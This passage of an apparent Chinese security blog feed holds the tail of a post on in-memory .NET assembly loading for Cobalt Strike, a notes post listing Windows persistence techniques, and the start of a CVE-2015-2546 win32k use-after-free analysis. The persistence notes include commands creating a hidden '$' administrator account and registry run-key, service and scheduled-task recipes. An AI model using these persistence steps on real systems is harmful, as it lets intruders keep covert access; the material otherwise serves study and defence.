8i64))(v17);</div><div class="line">[.....]</div><div class="line"> <span class="built_in"> if </span>( v17 )</div><div class="line">    result = (*(*v17 + 16i64))(v17);</div><div class="line"> <span class="built_in"> if </span>( v22 )</div><div class="line">    result = (*(*v22 + 16i64))(v22);</div><div class="line"> <span class="built_in"> if </span>( v18 )</div><div class="line">    result = ((*v18)[2])(v18);</div><div class="line"> <span class="built_in"> return </span>result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先初始化CLR环境，根据不同的版本采用不同的函数初始化CLR环境，<br>    <img src="http://hacky.wang/blog/20221008/vOqlGeHHW0Qb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;启动CLR环境<br>    <img src="http://hacky.wang/blog/20221008/HWJnw2B9Csga.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取默认的程序域<br>    <img src="http://hacky.wang/blog/20221008/uqr4o9zaz4v5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;加载assembly<br>    <img src="http://hacky.wang/blog/20221008/FxhAB2MGbTOw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取入口点，并执行。<br>    <img src="http://hacky.wang/blog/20221008/Xrq72Vs8oyip.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;idiotc4t在<a href="https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization" target="_blank" rel="external">Execute-Assembly实现</a>中仔细描述了如何编写一段内存加载.Net程序集。首先初始化CLR环境,CLR全称为公共语言运行库，即Common Language Runtime。CLR托管在进程中，是加载和运行.Net程序集的地方，关于CLR的概述可以参考<a href="https://learn.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="external">微软关于CLR的描述</a>。常见的windows进程并不会加载CLR环境，可以使用ProcessExplorer或者ProcessHacker等工具查看是否加载CLR环境。加载CLR环境主要分四步:<br>    <img src="http://hacky.wang/blog/20221022/HLDiM7zQzzEN.png?imageslim" alt="mark"></p><ul><li>1) 调用CLRCreateInstance函数以实例化<code>ICLRMetaHost</code>或<code>ICLRMetaHostPolicy</code>接口，CLRCreateInstance函数原型如下，第一个参数为clsid，第二个参数是 riid，第三个参数是返回的接口。</li></ul><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function">HRESULT <span class="title">CLRCreateInstance</span>(<span class="params">  </span></span></div><div class="line"><span class="function"><span class="params">    [<span class="keyword">in</span>]  REFCLSID  clsid,  </span></span></div><div class="line"><span class="function"><span class="params">    [<span class="keyword">in</span>]  REFIID     riid,  </span></span></div><div class="line"><span class="function"><span class="params">    [<span class="keyword">out</span>] LPVOID  * ppInterface  </span></span></div><div class="line"><span class="function"><span class="params"></span>)</span>;</div></pre></td></tr></table></figure><ul><li><p>2) 调用<code>ICLRMetaHost::EnumerateInstalledRuntimes</code>, <code>ICLRMetaHost::GetRuntime</code>或者<code>ICLRMetaHostPolicy::GetRequestedRuntime</code>方法以获取有效的ICLRRuntimeInfo指针。以<code>ICLRMetaHost::GetRuntime</code>为例，第一个参数为pwzVersion，表示 .NET Framework 的版本，riid为标识符，此参数的唯一有效值是 IID_ICLRRuntimeInfo。第三个参数是返回的ICLRRuntimeInfo接口的指针。</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HRESULT GetRuntime (  </div><div class="line">    [<span class="keyword">in</span>] LPCWSTR pwzVersion,  </div><div class="line">    [<span class="keyword">in</span>] REFIID riid,  </div><div class="line">    [<span class="keyword">out</span>,iid<span class="number">_</span><span class="keyword">is</span>(riid), retval] LPVOID *ppRuntime  </div><div class="line">);</div></pre></td></tr></table></figure></li><li><p>3) 调用<code>GetInterface</code>获取<code>ICorRuntimeHost</code>或者<code>ICLRRuntimeHost</code>。rclsid为接口的CLSID,riid是接口的iid，ppUnk返回的接口的指针。加载.Net程序集可以使用两种接口<code>ICorRuntimeHost</code>或者<code>ICLRRuntimeHost</code>。使用<code>ICorRuntimeHost</code>的有点是可以兼容V1.0的程序集，但是<code>ICLRRuntimeHost</code>在代码实现上会比较容易。</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HRESULT GetInterface(  </div><div class="line">[<span class="keyword">in</span>]  REFCLSID rclsid,  </div><div class="line">[<span class="keyword">in</span>]  REFIID   riid,  </div><div class="line">[<span class="keyword">out</span>, iid<span class="number">_</span><span class="keyword">is</span>(riid), retval] LPVOID *ppUnk);</div></pre></td></tr></table></figure></li><li><p>4）启动CLR环境集</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">CLRCreateInstance(<span class="name">CLSID_CLRMetaHost</span>, IID_ICLRMetaHost, (<span class="name">VOID**</span>)<span class="symbol">&amp;iMetaHost</span>)<span class="comment">;</span></div><div class="line">iMetaHost-&gt;GetRuntime(<span class="name">L</span><span class="string">"v4.0.30319"</span>, IID_ICLRRuntimeInfo, (<span class="name">VOID**</span>)<span class="symbol">&amp;iRuntimeInfo</span>)<span class="comment">;</span></div><div class="line">iRuntimeInfo-&gt;GetInterface(<span class="name">CLSID_CorRuntimeHost</span>, IID_ICorRuntimeHost, (<span class="name">VOID**</span>)<span class="symbol">&amp;iRuntimeHost</span>)<span class="comment">;</span></div><div class="line">iRuntimeHost-&gt;Start()<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序域为安全性、可靠性和版本控制以及卸载程序集提供了隔离边界，需要将程序集加载到对应的程序域中，才能执行其中包含的代码，这也就是为啥要获取程序集的原因了。程序集的加载方式决定了它的即时 (JIT) 编译代码是否可以由进程中的多个应用程序域共享，以及程序集是否可以从进程中卸载。具体关于程序域和程序集可以参考<a href="https://learn.microsoft.com/en-us/dotnet/framework/app-domains/application-domains" target="_blank" rel="external">微软关于程序域和程序集的概述</a>，通过调用<code>GetDefaultDomain</code>获取默认的程序集，并通过调用<code>QueryInterface</code>检索该程序集的接口。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iRuntimeHost-&gt;GetDefaultDomain(<span class="name">&amp;pAppDomain</span>)<span class="comment">;</span></div><div class="line">pAppDomain-&gt;QueryInterface(<span class="name">__uuidof</span>(<span class="name">_AppDomain</span>), (<span class="name">VOID**</span>)<span class="symbol">&amp;pDefaultAppDomain</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在拥有运行时环境CLR，已经可以被托管的容器程序域之后，可以加载程序集了。调用<code>Load_3</code>函数加载程序集安全数组，并获取入口点。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">HRESULT Load_3 (</div><div class="line">    SAFEARRAY* rawAssembly,</div><div class="line">    Assembly **pRetVal )</div><div class="line"></div><div class="line">pDefaultAppDomain-&gt;Load_3(<span class="name">pSafeArray</span>, <span class="symbol">&amp;pAssembly</span>)<span class="comment">;</span></div><div class="line">pAssembly-&gt;get_EntryPoint(<span class="name">&amp;pMethodInfo</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，调用Invoke_3执行程序集的入口点。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HRESULT hr = pMethodInfo-&gt;Invoke_3(<span class="name">vObj</span>, args, <span class="symbol">&amp;vRet</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><h2 id="0x09-参考"><a href="#0x09-参考" class="headerlink" title="0x09 参考"></a>0x09 参考</h2><ul><li><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">官方文档-Beacon Object Files</a></li><li><a href="https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/" target="_blank" rel="external">A DEVELOPER’S INTRODUCTION TO BEACON OBJECT FILES</a></li><li><a href="https://www.freebuf.com/articles/network/282744.html" target="_blank" rel="external">CobaltStirke BOF技术剖析（一）｜BOF实现源码级分析</a></li><li><a href="https://idiotc4t.com/weaponization/bof-weaponization" target="_blank" rel="external">https://idiotc4t.com/weaponization/bof-weaponization</a></li><li><a href="https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization" target="_blank" rel="external">Execute-Assembly实现</a></li><li><a href="https://3gstudent.github.io/从内存加载.NET程序集(execute-assembly" target="_blank" rel="external">从内存加载.NET程序集的利用分析</a>的利用分析)</li><li><a href="https://learn.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="external">微软关于CLR的描述</a></li><li><a href="https://learn.microsoft.com/en-us/dotnet/framework/app-domains/application-domains" target="_blank" rel="external">微软关于程序域和程序集的概述</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文首发于跳跳糖安全社区&lt;a href=&quot;https://tttang.com/archive/1786/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1786/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Persistence</title>
    <link href="https://findream.github.io/2022/11/08/%E6%8C%81%E4%B9%85%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <id>https://findream.github.io/2022/11/08/持久化总结/</id>
    <published>2022-11-08T07:02:11.000Z</published>
    <updated>2023-02-28T13:35:11.797Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Persistence学习总结<a id="more"></a></li></ul><h2 id="0x01-WLL加载项"><a href="#0x01-WLL加载项" class="headerlink" title="0x01 WLL加载项"></a>0x01 WLL加载项</h2><ul><li>%AppData%\Microsoft\Word\STARTUP</li></ul><h2 id="0x02-XLL加载项"><a href="#0x02-XLL加载项" class="headerlink" title="0x02 XLL加载项"></a>0x02 XLL加载项</h2><ul><li>保存在%AppData%\Microsoft\AddIns</li><li>XLL文件导出函数名必须为”xlAutoOpen”</li><li>HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Excel\Options “OPEN”属性，值为”/ R 任意文件名.xll”</li></ul><h2 id="0x03-WORD-VBA模板"><a href="#0x03-WORD-VBA模板" class="headerlink" title="0x03 WORD VBA模板"></a>0x03 WORD VBA模板</h2><ul><li>保存路径为%AppData%\Microsoft\Templates</li></ul><h2 id="0x04-Execel-VBA模板设置屏幕保护程序"><a href="#0x04-Execel-VBA模板设置屏幕保护程序" class="headerlink" title="0x04 Execel VBA模板设置屏幕保护程序"></a>0x04 Execel VBA模板设置屏幕保护程序</h2><ul><li>文件格式为”.xla”或者”.xlam”格式</li><li>保存路径为%appdata%\Microsoft\Excel\XLSTART </li></ul><h2 id="0x05-PowerPoint-VBA模板"><a href="#0x05-PowerPoint-VBA模板" class="headerlink" title="0x05 PowerPoint VBA模板"></a>0x05 PowerPoint VBA模板</h2><ul><li>文件格式为”.ppam”或”.ppa”</li><li>保存位置为%appdata%\Microsoft\AddIns</li><li>设置注册表HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\PowerPoint\AddIns\&lt;任意名字&gt;</li><li>新建DWORD值 名字为”Autoload”, 值为1</li><li>新建String值，名字为”Path”, 值为文件路径</li></ul><h2 id="0x06-Office-test"><a href="#0x06-Office-test" class="headerlink" title="0x06 Office test"></a>0x06 Office test</h2><ul><li>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</li><li>新建默认名称(Default)的Key，值为文件路径</li></ul><h2 id="0x07-针对Word-Hunt-思路"><a href="#0x07-针对Word-Hunt-思路" class="headerlink" title="0x07 针对Word Hunt 思路"></a>0x07 针对Word Hunt 思路</h2><ul><li><ol><li>ProcessMonitor操作设置为”IRP_MJ_DIRECTORY_CONTROL”,结果设置为”NO SUCH FILE” 可以Hunt到诸如<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\M</span>icrosoft Office<span class="symbol">\r</span>oot<span class="symbol">\V</span>FS<span class="symbol">\S</span>ystemX86<span class="symbol">\E</span>hStorShell.dll"</div><div class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\M</span>icrosoft Office<span class="symbol">\r</span>oot<span class="symbol">\V</span>FS<span class="symbol">\S</span>ystemX86<span class="symbol">\n</span>tshrui.dll"</div></pre></td></tr></table></figure></li></ol></li><li><ol><li>ProcessMonitor操作设置为”RegQueryValue” ,结果设置为”NAME NOT FOUND”,路径起始设置为”HKCU\Software\Microsoft\Office”,可以Hunt到如<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\O</span>ffice<span class="symbol">\1</span>6.0<span class="symbol">\W</span>ord<span class="symbol">\O</span>ptions<span class="symbol">\S</span>TARTUP-PATH</div></pre></td></tr></table></figure></li></ol></li></ul><h2 id="COM劫持思路"><a href="#COM劫持思路" class="headerlink" title="COM劫持思路"></a>COM劫持思路</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="string">[1]</span> 增加缺少的CLSID的路径</div><div class="line"><span class="string">[2]</span> 修改原有的CLSID加载的程序</div><div class="line"><span class="string">[3]</span> 修改原有的CLSID加载的路径</div></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://3gstudent.github.io/Use-Office-to-maintain-persistence" target="_blank" rel="external">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></li><li><a href="https://cloud.tencent.com/developer/article/1819454" target="_blank" rel="external">https://cloud.tencent.com/developer/article/1819454</a></li></ul><h2 id="常见持久化技术简介"><a href="#常见持久化技术简介" class="headerlink" title="常见持久化技术简介"></a>常见持久化技术简介</h2><ul><li><p>利用启动项(文件目录)实现持久化</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:<span class="symbol">\P</span>rogramData<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\S</span>tart Menu<span class="symbol">\P</span>rograms<span class="symbol">\S</span>tartUp</div><div class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\[</span>Username]<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\S</span>tart Menu<span class="symbol">\P</span>rograms<span class="symbol">\S</span>tartup</div></pre></td></tr></table></figure></li><li><p>利用启动项(注册表)实现持久化</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[1] HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</div><div class="line">[2] HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</div><div class="line">[3] HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnceEx</div><div class="line">[4] HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\E</span>xplorer<span class="symbol">\U</span>ser Shell Folders</div><div class="line">[...]</div></pre></td></tr></table></figure></li><li><p>利用Windows服务实现持久化</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] <span class="keyword">sc </span>create servicename <span class="keyword">binpath </span>...</div></pre></td></tr></table></figure></li><li><p>利用计划任务实现</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[1]</span> <span class="selector-tag">schtasks</span> /<span class="selector-tag">create</span> ...</div><div class="line"><span class="selector-attr">[2]</span> 利用<span class="selector-tag">C</span>++ <span class="selector-tag">COM</span>组件实现 </div><div class="line"><span class="selector-attr">[3]</span> <span class="selector-tag">Ref</span>:<span class="selector-attr">[VC++创建计划任务的若干方式]</span> <span class="selector-tag">https</span>:<span class="comment">//blog.csdn.net/chantsky/article/details/82904942</span></div></pre></td></tr></table></figure></li><li><p>利用BITS实现</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="string">[1]</span> 后台智能传输服务</div><div class="line"><span class="string">[2]</span> bitsadmin /create</div></pre></td></tr></table></figure></li><li><p>LSA 身份认证包</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[1]</span> 系统启动中，本地安全机构(LSA)会启动<span class="selector-tag">LSA</span>身份认证包<span class="selector-tag">DLL</span></div><div class="line"><span class="selector-attr">[2]</span></div></pre></td></tr></table></figure></li><li><p>用户登入初始化程序</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[1] windows 登录之时，winlogon.exe进程会依赖注册表加载和执行.dll文件和.exe文件。</div><div class="line">[2] HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\W</span>inlogon<span class="symbol">\U</span>serinit  用户登录时执行的用户初始化程序</div><div class="line">[3] HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\W</span>inlogon<span class="symbol">\S</span>hell 用户登录时执行的系统 shell</div><div class="line">[4] HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\N</span>otify 处理 Winlogon 事件的通知包 DLL</div></pre></td></tr></table></figure></li><li><p>登录脚本</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] windows 允许在登录到系统之时运行脚本</div><div class="line">[<span class="number">2</span>] 在`HKCU\Environment`下新建名为 `UserInitMprLogonScript`的项，值为程序路径</div></pre></td></tr></table></figure></li><li><p>影子账户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[1] 新建用户net<span class="built_in"> user </span>username1$ password1 /add</div><div class="line">[2] 添加到管理员组net localgroup administrators username1$ /add</div></pre></td></tr></table></figure></li><li><p>修改默认文件关联</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] 先在`HKEY_CLASS_ROOT`寻找目标的文件格式</div><div class="line">[<span class="number">2</span>] 然后在`HKCR\[filetype]\shell\open\command`的默认项中添加路径</div></pre></td></tr></table></figure></li><li><p>设置屏幕保护程序</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] 在`HKEY_CURRENT_USER\\Control Panel\\Desktop`下添加</div><div class="line">[<span class="number">2</span>] SCRNSAVE.EXE：路径</div><div class="line">[<span class="number">3</span>] ScreenSaveActive = <span class="number">1</span>表示屏幕保护是启动状态，<span class="number">0</span>表示表示屏幕保护是关闭状态</div><div class="line">[<span class="number">4</span>] ScreenSaverTimeout = 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为<span class="number">900</span></div><div class="line">``` </div><div class="line"></div><div class="line">* WMI事件订阅</div></pre></td></tr></table></figure></li></ul><p>[1] EventFilter 事件筛选器<br>[2] EventConsumer 事件消费者<br>[3] FilterToConsumerBinding 绑定关系<br>[4] 注:微软文档有错误，所以导致一众大佬复现不了<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>辅助功能(Shift后门)</div></pre></td></tr></table></figure></p><p>[1] 貌似windows xp 可以直接使用<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>AppCert DLL</div></pre></td></tr></table></figure></p><p>[1] 只要进程中调用CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW和WinExec函数，就会依据<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code>加载所记录的dll文件<br>[2] 在默认键值下添加路径即可<br>```</p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;Persistence学习总结
    
    </summary>
    
      <category term="安全" scheme="https://findream.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2015-2546内核提权漏洞分析</title>
    <link href="https://findream.github.io/2022/08/16/CVE-2015-2546%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/08/16/CVE-2015-2546内核提权漏洞分析/</id>
    <published>2022-08-16T06:02:11.000Z</published>
    <updated>2022-10-23T12:42:12.023Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言及原因分析"><a href="#0x00-前言及原因分析" class="headerlink" title="0x00 前言及原因分析"></a>0x00 前言及原因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2015-2546是发生在<code>win32k!xxxMNMouseMove</code>函数的一个释放后重引用漏洞(UAF),在<code>win32k!xxxMNMouseMove</code>中调用xxxSendMessage发送<code>MN_SELECTITEM(0x1E5)</code>和<code>MN_SETTIMERTOOPENHIERARCHY(0x1F0)</code>消息的时候，执行流可能会回调进入用户侧，当执行流从用户侧返回之后，<code>win32k!xxxMNMouseMove</code>函数并没有对<code>tagPopupMenu</code>对象进行校验，就将其传入<code>win32k!xxxMNHideNextHierarchy</code>对其进行了访问，从而引用UAF。</p><a id="more"></a><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8263</span> 000                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">Src</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8264</span> 004                 <span class="selector-tag">push</span>    <span class="selector-attr">[ebp+cmdItem]</span>   ; <span class="selector-tag">WideCharString</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8267</span> 008                 <span class="selector-tag">push</span>    1<span class="selector-tag">E5h</span>            ; <span class="selector-tag">message</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB826C</span> 00<span class="selector-tag">C</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">esi</span>             ; <span class="selector-tag">P</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB826D</span> 010                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxSendMessage</span>@<span class="keyword">16</span> ; <span class="selector-tag">xxxSendMessage</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8272</span> 000                 <span class="selector-tag">test</span>    <span class="selector-tag">al</span>, 10<span class="selector-tag">h</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8274</span> 000                 <span class="selector-tag">jz</span>      <span class="selector-tag">short</span> <span class="selector-tag">loc_95AB82CD</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8276</span> 000                 <span class="selector-tag">test</span>    <span class="selector-tag">al</span>, 3</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8278</span> 000                 <span class="selector-tag">jnz</span>     <span class="selector-tag">short</span> <span class="selector-tag">loc_95AB82CD</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB827A</span> 000                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">Src</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB827B</span> 004                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">WideCharString</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB827C</span> 008                 <span class="selector-tag">push</span>    1<span class="selector-tag">F0h</span>            ; <span class="selector-tag">message</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8281</span> 00<span class="selector-tag">C</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">esi</span>             ; <span class="selector-tag">P</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8282</span> 010                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxSendMessage</span>@<span class="keyword">16</span> ; <span class="selector-tag">xxxSendMessage</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8287</span> 000                 <span class="selector-tag">test</span>    <span class="selector-tag">eax</span>, <span class="selector-tag">eax</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8289</span> 000                 <span class="selector-tag">jnz</span>     <span class="selector-tag">short</span> <span class="selector-tag">loc_95AB82CD</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB828B</span> 000                 <span class="selector-tag">push</span>    <span class="selector-tag">ebx</span>             ; <span class="selector-tag">a1</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB828C</span> 004                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxMNHideNextHierarchy</span>@<span class="keyword">4</span> ; <span class="selector-tag">xxxMNHideNextHierarchy</span>(<span class="selector-tag">x</span>)</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果在执行流回到用户侧时，销毁目标菜单对象，然后在经过巧妙的内存布局，使系统重新分配内存重新占用销毁的目标菜单对象所占据的内存，然后通过巧妙的伪装，在<code>Win32k!xxxMNHideNextHierarchy</code>调用发送<code>MN_SELECTITEM(0x1E5)</code>消息，从而像CVE-2014-4113一样，执行预先设置好的ShellCode提权代码。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">int</span> __stdcall xxxMNHideNextHierarchy(tagPOPUPMENU *<span class="built_in">a1</span>)</div><div class="line">&#123;</div><div class="line">  tagWND *<span class="built_in">v1</span><span class="comment">; // eax</span></div><div class="line">  tagWND *<span class="built_in">v2</span><span 